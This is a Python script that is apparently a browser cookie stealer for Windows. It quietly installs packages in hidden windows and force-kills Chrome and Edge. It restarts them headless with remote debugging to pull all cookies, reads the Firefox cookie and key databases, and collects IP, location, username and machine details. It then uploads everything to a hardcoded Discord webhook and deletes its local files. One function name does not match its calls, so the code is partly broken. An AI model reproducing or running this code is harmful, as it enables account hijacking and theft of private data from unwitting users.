import os
import sys
import random
import json
import subprocess
import site
import ctypes
import sqlite3
import time
import platform



# Function to install libraries in a hidden window
def install_libraries():
    required_libraries = ['cryptography', 'requests', 'websocket-client', 'threading', 'zipfile']
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            print(f"{lib} not found. Installing...")
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            subprocess.Popen(
                ['python', '-m', 'pip', 'install', '--user', lib],
                startupinfo=startupinfo,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                shell=True
            ).wait()

# Install required libraries if missing
install_libraries()

import requests
import websocket
import threading
import zipfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend




# Configuration
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1349997456145776682/jmrcR8KntW1LfoJ5z6SG6UKHAJrEWR1NC-VCYUNgjp2wA3uWzvVB5SGCEYK4ABZKaSZ5"



# Browser configurations
CHROME_DEBUG_PORT = 9222
CHROME_DEBUG_URL = f'http://localhost:{CHROME_DEBUG_PORT}/json'
CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
CHROME_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Google\Chrome\User Data'
CHROME_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'chrome_cookies.json')

EDGE_DEBUG_PORT = 9223
EDGE_DEBUG_URL = f'http://localhost:{EDGE_DEBUG_PORT}/json'
EDGE_PATH = rf"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
EDGE_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Microsoft\Edge\User Data'
EDGE_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'edge_cookies.json')

FIREFOX_PROFILE_DIR = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')

def run_command_hidden(command):
    """Run a command in a hidden window."""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        process = subprocess.Popen(
            command,
            startupinfo=startupinfo,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            shell=True
        )
        process.wait()
    except Exception as e:
        pass

def get_system_info():
    """Get system information."""
    try:
        ip_info = requests.get('https://ipinfo.io').json()
        return {
            'ip_address': ip_info.get('ip', 'Unknown'),
            'location': f"{ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown')}",
            'username': os.getenv('USERNAME'),
            'computer_name': os.getenv('COMPUTERNAME'),
            'windows_version': platform.version(),
            'user_agent': 'Not yet retrieved'
        }
    except Exception as e:
        return {
            'ip_address': 'Unknown',
            'location': 'Unknown',
            'username': 'Unknown',
            'computer_name': 'Unknown',
            'windows_version': 'Unknown',
            'user_agent': 'Unknown'
        }

def get_user_agent(debug_url):
    """Get user agent from browser and remove 'Headless' from the string."""
    try:
        res = requests.get(debug_url)
        res.raise_for_status()
        data = res.json()
        if not data:
            return None
        url = data[0]['webSocketDebuggerUrl'].strip()
        ws = websocket.create_connection(url)
        ws.send(json.dumps({'id': 1, 'method': 'Browser.getVersion'}))
        response = ws.recv()
        response = json.loads(response)
        user_agent = response['result']['userAgent']
        user_agent = user_agent.replace('Headless', '').replace('  ', ' ').strip()
        return user_agent
    except Exception as e:
        return None
    finally:
        if 'ws' in locals():
            ws.close()

def start_browser_in_debug_mode(browser_path, port, user_data_dir):
    """Start the browser in debug mode and return the process object."""
    try:
        subprocess.run(f'taskkill /F /IM {os.path.basename(browser_path)}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        command = [browser_path, f'--remote-debugging-port={port}', '--remote-allow-origins=*', '--headless', f'--user-data-dir={user_data_dir}']
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return process
    except Exception as e:
        return None

def extract_chrome_edge_cookies(debug_url, cookie_file):
    """Extract cookies from Chrome or Edge using the remote debugging protocol."""
    try:
        res = requests.get(debug_url)
        res.raise_for_status()
        data = res.json()
        if not data:
            return
        url = data[0]['webSocketDebuggerUrl'].strip()
        ws = websocket.create_connection(url)
        ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
        response = ws.recv()
        response = json.loads(response)
        cookies = response['result']['cookies']
        transformed_cookies = transform_cookies(cookies)
        with open(cookie_file, 'w') as f:
            json.dump(transformed_cookies, f, indent=4)
    except Exception as e:
        pass
    finally:
        if 'ws' in locals():
            ws.close()

def _transform_cookies(self, cookies):
    """Transform cookies into standard format with corrected sameSite values"""
    transformed = []
    for cookie in cookies:
        if len(cookie) == 8:  # Firefox cookies
            name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
        else:  # Chrome/Edge cookies
            name = cookie['name']
            value = cookie['value']
            domain = cookie['domain']
            path = cookie['path']
            expiry = cookie.get('expires', 0)
            is_secure = cookie.get('secure', False)
            is_http_only = cookie.get('httpOnly', False)
            same_site = cookie.get('sameSite', 'unspecified')
        
        # Fix sameSite values to match allowed options
        if same_site.lower() == 'none':
            same_site = 'no_restriction'
        elif same_site.lower() == 'lax':
            same_site = 'lax'
        elif same_site.lower() == 'strict':
            same_site = 'strict'
        else:
            same_site = 'unspecified'  # default if not matching any known value
        
        transformed_cookie = {
            "domain": domain,
            "expirationDate": expiry,
            "hostOnly": not domain.startswith('.'),
            "httpOnly": bool(is_http_only),
            "name": name,
            "path": path,
            "sameSite": same_site,
            "secure": bool(is_secure),
            "session": expiry == 0,
            "storeId": "0",
            "value": value
        }
        transformed.append(transformed_cookie)
    return transformed

def find_firefox_profile():
    """Find the default Firefox profile directory."""
    try:
        for profile in os.listdir(FIREFOX_PROFILE_DIR):
            if profile.endswith('.default-release'):
                return os.path.join(FIREFOX_PROFILE_DIR, profile)
        return None
    except Exception as e:
        return None

def extract_firefox_cookies(profile_dir):
    """Extract cookies from Firefox's cookies.sqlite database."""
    try:
        cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
        key4_db = os.path.join(profile_dir, 'key4.db')
        if not os.path.exists(cookies_db) or not os.path.exists(key4_db):
            return [], None
        conn = sqlite3.connect(cookies_db)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value, host, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies")
        cookies = cursor.fetchall()
        conn.close()
        conn = sqlite3.connect(key4_db)
        cursor = conn.cursor()
        cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
        row = cursor.fetchone()
        global_salt = row[0]
        item2 = row[1]
        cursor.execute("SELECT a11, a102 FROM nssPrivate")
        row = cursor.fetchone()
        a11 = row[0]
        a102 = row[1]
        conn.close()
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=a102,
            iterations=1,
            backend=default_backend()
        )
        key = kdf.derive(global_salt + a11)
        return cookies, key
    except Exception as e:
        return [], None

def send_to_discord(file_path, system_info=None, browser_name=None):
    """Send a file to Discord."""
    if not os.path.exists(file_path):
        return
    
    try:
        # Extract unique domains
        unique_domains = extract_unique_domains(file_path)
        
        # Create a zip file containing the cookies file
        zip_file_path = os.path.splitext(file_path)[0] + '.zip'
        with zipfile.ZipFile(zip_file_path, 'w') as zipf:
            zipf.write(file_path, os.path.basename(file_path))
        
        # Create a text file containing the list of unique domains
        domains_file_path = os.path.splitext(file_path)[0] + '_domains.txt'
        with open(domains_file_path, 'w') as domains_file:
            for domain in unique_domains:
                domains_file.write(f"{domain}\n")
        
        # Prepare the message
        message = ""
        if system_info:
            message = (
                f"**System Information:**\n"
                f"IP Address: {system_info['ip_address']}\n"
                f"Location: {system_info['location']}\n"
                f"Username: {system_info['username']}\n"
                f"Computer: {system_info['computer_name']}\n"
                f"Windows Version: {system_info['windows_version']}\n"
                f"User Agent: {system_info.get('user_agent', 'Unknown')}\n\n"
            )
        if browser_name:
            message += f"## {browser_name} Cookies\n"
            message += f"**Domains:**\n"
            for domain in unique_domains:
                message += f"- {domain}\n"
            message += "\n"
        
        # Send both files to Discord
        with open(zip_file_path, 'rb') as zip_file, open(domains_file_path, 'rb') as domains_file:
            files = {
                'file1': (os.path.basename(zip_file_path), zip_file),
                'file2': (os.path.basename(domains_file_path), domains_file)
            }
            response = requests.post(DISCORD_WEBHOOK_URL, data={'content': message}, files=files)
        
        # Clean up temporary files
        os.remove(zip_file_path)
        os.remove(domains_file_path)
        
    except Exception as e:
        print(f"An error occurred: {e}")

def delete_cookie_file(file_path):
    """Delete the cookie file after sending it to Discord."""
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"Deleted {file_path}")
    except Exception as e:
        print(f"Failed to delete {file_path}: {e}")

def extract_unique_domains(cookie_file):
    """Extract unique domains from a cookies JSON file."""
    try:
        with open(cookie_file, 'r') as f:
            cookies = json.load(f)
        unique_domains = set()
        for cookie in cookies:
            domain = cookie.get('domain', '')
            if domain:
                unique_domains.add(domain)
        return list(unique_domains)
    except Exception as e:
        return []

def extract_browser_cookies():
    """Extract cookies from Chrome, Edge, and Firefox."""
    system_info = get_system_info()
    for browser, port, path, data_dir, cookie_file in [
        ('chrome.exe', CHROME_DEBUG_PORT, CHROME_PATH, CHROME_USER_DATA_DIR, CHROME_COOKIE_FILE),
        ('msedge.exe', EDGE_DEBUG_PORT, EDGE_PATH, EDGE_USER_DATA_DIR, EDGE_COOKIE_FILE)
    ]:
        process = start_browser_in_debug_mode(path, port, data_dir)
        if process:
            time.sleep(5)
            user_agent = get_user_agent(f'http://localhost:{port}/json')
            if user_agent:
                system_info['user_agent'] = user_agent
                print(f"User Agent for {browser}: {user_agent}")
            extract_chrome_edge_cookies(f'http://localhost:{port}/json', cookie_file)
            send_to_discord(cookie_file, system_info, browser.capitalize())
            delete_cookie_file(cookie_file)
            process.terminate()
            process.wait()
    try:
        profile_dir = find_firefox_profile()
        if profile_dir:
            cookies, key = extract_firefox_cookies(profile_dir)
            if cookies:
                transformed_cookies = transform_cookies(cookies)
                with open(FIREFOX_COOKIE_FILE, 'w') as f:
                    json.dump(transformed_cookies, f, indent=4)
                send_to_discord(FIREFOX_COOKIE_FILE, system_info, "Firefox")
                delete_cookie_file(FIREFOX_COOKIE_FILE)
    except Exception as e:
        pass

extract_browser_cookies()